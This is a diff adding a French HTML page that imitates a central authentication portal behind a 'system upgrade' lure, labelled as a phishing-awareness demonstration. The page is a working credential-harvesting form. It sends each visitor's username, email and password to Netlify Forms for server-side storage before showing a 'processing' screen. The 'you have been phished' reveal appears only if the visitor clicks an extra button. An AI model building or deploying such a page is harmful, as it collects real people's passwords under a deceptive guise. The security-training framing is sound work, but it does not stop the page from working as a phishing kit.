@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Service D'authentification Centrale</title>
+<style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+        background:#1a73e8; font-family:Arial,sans-serif;
+        min-height:100vh; display:flex; justify-content:center;
+        align-items:center; padding:20px;
+    }
+    .container {
+        background:white; border-radius:15px; padding:40px;
+        width:100%; max-width:450px;
+        box-shadow:0 10px 30px rgba(0,0,0,0.2);
+    }
+    h1 { color:#1a73e8; text-align:center; margin-bottom:30px; font-size:28px; }
+    h2 { color:#333; text-align:center; margin-bottom:25px; font-size:22px; }
+    .form-group { margin-bottom:20px; }
+    label { display:block; margin-bottom:8px; color:#555; font-weight:bold; }
+    input {
+        width:100%; padding:14px; border:2px solid #ddd;
+        border-radius:8px; font-size:16px;
+    }
+    input:focus { border-color:#1a73e8; outline:none; }
+    .submit-btn {
+        width:100%; padding:15px; background:#1a73e8; color:white;
+        border:none; border-radius:8px; font-size:18px;
+        font-weight:bold; cursor:pointer; margin-top:10px;
+    }
+    .submit-btn:hover { background:#0d62d9; }
+    .logo {
+        text-align:center; margin-bottom:20px; color:#1a73e8;
+        font-size:14px; font-weight:bold; letter-spacing:1px;
+    }
+
+    #redirectPage {
+        display:none; background:white; border-radius:15px; padding:40px;
+        width:100%; max-width:520px;
+        box-shadow:0 10px 30px rgba(0,0,0,0.2); text-align:center;
+    }
+    .success-icon { font-size:60px; color:#4CAF50; margin-bottom:20px; }
+    #redirectPage h1 { color:#1a73e8; margin-bottom:20px; font-size:24px; }
+    .message { color:#333; font-size:16px; line-height:1.6; margin-bottom:25px; }
+    .highlight { color:#1a73e8; font-weight:bold; }
+    .loader {
+        border:5px solid #f3f3f3; border-top:5px solid #1a73e8;
+        border-radius:50%; width:50px; height:50px;
+        animation:spin 1s linear infinite; margin:0 auto 20px;
+    }
+    @keyframes spin { 100% { transform:rotate(360deg); } }
+    .close-btn {
+        padding:15px 40px; background:#d32f2f; color:white;
+        border:none; border-radius:8px; font-size:16px;
+        font-weight:bold; cursor:pointer; margin-top:15px;
+    }
+    .close-btn:hover { background:#b71c1c; }
+
+    .reveal {
+        display:none; margin-top:25px; padding:20px; border-radius:10px;
+        background:#fff3cd; border-left:5px solid #ffc107; text-align:left;
+    }
+    .reveal.visible { display:block; animation:fadeIn 0.6s ease; }
+    @keyframes fadeIn {
+        from { opacity:0; transform:translateY(10px); }
+        to   { opacity:1; transform:translateY(0); }
+    }
+    .reveal h2 { color:#b71c1c; margin-bottom:15px; font-size:20px; }
+    .reveal p { color:#333; font-size:15px; line-height:1.6; margin-bottom:10px; }
+    .reveal code {
+        display:block; background:#1e1e1e; color:#f1f1f1; padding:12px;
+        border-radius:6px; font-family:monospace; font-size:13px;
+        word-break:break-all; margin-top:8px;
+    }
+    .reveal-trigger {
+        margin-top:20px; padding:12px 25px; background:#ffc107;
+        color:#333; border:none; border-radius:8px; font-size:15px;
+        font-weight:bold; cursor:pointer;
+    }
+    .reveal-trigger:hover { background:#ffb300; }
+
+    .demo-banner {
+        position:fixed; bottom:0; left:0; right:0;
+        background:#000; color:#fff; text-align:center;
+        font-size:12px; padding:6px; letter-spacing:1px; opacity:0.7;
+    }
+</style>
+</head>
+<body>
+
+<!-- ================= PAGE LOGIN ================= -->
+<div class="container" id="loginPage">
+    <div class="logo">SERVICE D'AUTHENTIFICATION CENTRALE</div>
+    <h1>Authentification Système</h1>
+    <h2>Connexion</h2>
+
+    <!-- ⚠️ ATTRIBUTS NETLIFY FORMS AJOUTÉS -->
+    <form id="loginForm"
+          name="login"
+          method="POST"
+          data-netlify="true"
+          netlify-honeypot="bot-field">
+        
+        <!-- Champ caché OBLIGATOIRE pour Netlify -->
+        <input type="hidden" name="form-name" value="login">
+        
+        <!-- Honeypot anti-bot (invisible pour humains) -->
+        <p style="display:none;">
+            <label>Ne pas remplir : <input name="bot-field"></label>
+        </p>
+
+        <div class="form-group">
+            <label for="username">Nom D'utilisateur :</label>
+            <input type="text" id="username" name="username" required placeholder="Entrez votre nom d'utilisateur">
+        </div>
+        <div class="form-group">
+            <label for="email">Email :</label>
+            <input type="email" id="email" name="email" required placeholder="entrez votre adresse email">
+        </div>
+        <div class="form-group">
+            <label for="password">Mot de passe :</label>
+            <input type="password" id="password" name="password" required placeholder="Entrez votre mot de passe">
+        </div>
+        <button type="submit" class="submit-btn">Se connecter</button>
+    </form>
+</div>
+
+<!-- ============== PAGE TRAITEMENT + RÉVÉLÉ ============== -->
+<div id="redirectPage">
+    <div class="success-icon">✓</div>
+    <h1>TRAITEMENT EN COURS</h1>
+    <div class="loader"></div>
+    <div class="message">
+        <p>Votre demande est en cours de traitement pour la mise à niveau du système.</p>
+        <p>Un email automatique de confirmation sera envoyé à l'adresse indiquée.</p>
+        <p class="highlight">Veuillez vérifier votre boîte de réception.</p>
+    </div>
+    <button class="close-btn" onclick="closeWindow()">FERMER</button>
+    <br>
+    <button class="reveal-trigger"
+            onclick="document.getElementById('reveal').classList.add('visible'); this.style.display='none';">
+        🔍 VOIR CE QUI S'EST RÉELLEMENT PASSÉ
+    </button>
+
+    <div class="reveal" id="reveal">
+        <h2>⚠ VOUS AVEZ ÉTÉ PHISHÉ</h2>
+        <p>Cette page n'était <strong>pas</strong> un vrai service d'authentification. Voici ce que vous venez de transmettre :</p>
+        <p><strong>Nom d'utilisateur :</strong></p>
+        <code id="rUser"></code>
+        <p style="margin-top:10px;"><strong>Email :</strong></p>
+        <code id="rEmail"></code>
+        <p style="margin-top:10px;"><strong>Mot de passe :</strong></p>
+        <code id="rPass"></code>
+        <p style="margin-top:10px;"><strong>Date/heure :</strong></p>
+        <code id="rTime"></code>
+        <p style="margin-top:15px;">💡 <strong>Leçon :</strong> toujours vérifier l'URL et le cadenas HTTPS avant de saisir ses identifiants.</p>
+    </div>
+</div>
+
+<div class="demo-banner">DÉMONSTRATION PÉDAGOGIQUE — test-pedago.net</div>
+
+<script>
+    // ======================================================
+    // Soumission : envoi AJAX vers Netlify Forms
+    // + affichage du mode révélé
+    // ======================================================
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const form = e.target;
+        const username = document.getElementById('username').value.trim();
+        const email    = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value;
+        const now      = new Date().toLocaleString('fr-FR');
+
+        if (!username || !email || !password) {
+            alert('Veuillez remplir tous les champs');
+            return;
+        }
+
+        // --- Envoi à Netlify Forms ---
+        const formData = new FormData(form);
+        formData.append('timestamp', now);
+
+        try {
+            await fetch('/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams(formData).toString()
+            });
+        } catch (err) {
+            console.warn('Envoi Netlify Forms échoué:', err);
+        }
+
+        // --- Remplir le mode révélé ---
+        document.getElementById('rUser').textContent  = username;
+        document.getElementById('rEmail').textContent = email;
+        document.getElementById('rPass').textContent  = password;
+        document.getElementById('rTime').textContent  = now;
+
+        // --- Basculer l'affichage ---
+        document.getElementById('loginPage').style.display = 'none';
+        document.getElementById('redirectPage').style.display = 'block';
+    });
+
+    function closeWindow() {
+        try { window.close(); } catch(e) {}
+        setTimeout(() => { window.location.href = 'about:blank'; }, 100);
+    }
+</script>
+</body>
+</html>
